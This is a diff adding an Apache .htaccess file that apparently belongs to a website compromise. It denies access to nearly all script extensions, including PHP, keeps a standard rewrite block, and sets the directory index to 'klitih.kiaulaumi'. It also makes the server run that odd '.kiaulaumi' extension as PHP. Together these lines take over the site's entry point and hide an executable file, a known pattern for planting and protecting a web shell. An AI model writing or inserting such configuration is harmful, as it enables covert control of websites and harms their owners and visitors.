@@ -1,0 +1,74 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.T*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.t*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.y*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Y*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.u*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.U*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.h*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.H*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+Options -Indexes
+DirectoryIndex klitih.kiaulaumi
+AddType application/x-httpd-php .kiaulaumi
